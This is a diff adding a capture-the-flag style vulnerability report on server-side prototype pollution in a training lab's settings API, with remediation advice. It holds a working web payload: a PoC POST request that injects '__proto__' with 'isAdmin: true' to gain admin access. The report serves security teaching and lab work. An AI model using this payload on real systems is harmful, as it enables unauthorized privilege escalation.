@@ -1,0 +1,128 @@
+🔹 Title
+
+Server‑Side Prototype Pollution Allows Unauthorized Admin Access
+
+
+
+🔹 Affected Lab and Component
+
+*Lab Name:* WebSploit Proto‑Pollute (Server‑Side Prototype Pollution Lab)
+
+*Component:* Settings Merge API
+
+*Endpoint:* /api/settings/update (or equivalent settings endpoint)
+
+*Parameter:* JSON body (settings object)
+
+*Container:* proto‑pollute lab container
+
+*Port:* Lab‑specific exposed port
+
+
+ 🔹 Vulnerability Classification
+
+*CWE:* CWE‑1321 – Improperly Controlled Modification of Object Prototype Attributes
+
+*OWASP Top 10:* A03:2021 – Injection
+
+
+
+## 🔹 CVSS v3.1 Score
+
+*Score:* 9.1 (Critical)
+
+*Vector:*
+
+CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+
+
+
+🔹 Description
+
+The application provides a settings update feature that merges user‑supplied JSON data directly into a server‑side object without validating or sanitizing input keys.
+
+By submitting a crafted payload containing the __proto__ property, an attacker can modify the global Object.prototype. This pollution propagates to all objects in the application, allowing the attacker to set isAdmin = true universally.
+
+As a result, authorization checks relying on this property are bypassed, granting unauthorized administrative access.
+
+
+🔹 Exploitation Steps
+
+1. Open the application and navigate to the *Update Settings* feature.
+
+2. Intercept the settings update request via browser developer tools.
+
+3. Replace the original payload:
+
+json
+{"theme": "dark"}
+
+
+with the malicious payload:
+
+json
+{
+  "__proto__": {
+    "isAdmin": true
+  }
+}
+
+
+4. Send the modified request.
+
+5. Observe the server response indicating successful pollution and access escalation.
+
+6. Access the Admin Panel to confirm privilege escalation.
+
+
+
+🔹 Proof of Concept (PoC)
+
+
+POST /api/settings/update HTTP/1.1
+Host: localhost
+Content-Type: application/json
+
+{
+  "__proto__": {
+    "isAdmin": true
+  }
+}
+
+
+*Server Response:*
+
+
+{
+  "status": "Settings updated",
+  "polluted": true,
+  "message": "WARNING: Object.prototype has been polluted! isAdmin is now true for all objects."
+}
+
+
+Result:
+
+
+Access GRANTED to Admin Panel
+flag{proto_pollution_master}
+
+
+🔹 Impact
+
+Successful exploitation allows:
+
+* Privilege escalation to administrator
+* Bypass of authorization controls
+* Manipulation of application logic
+* Potential full compromise of application security
+
+
+
+🔹 Remediation
+
+* Reject or sanitize dangerous keys such as __proto__, constructor, and prototype
+* Use secure object merging techniques (e.g., structured cloning)
+* Validate input using strict schemas
+* Freeze or seal critical objects to prevent prototype modification
+* Apply security testing for prototype pollution vulnerabilities
+
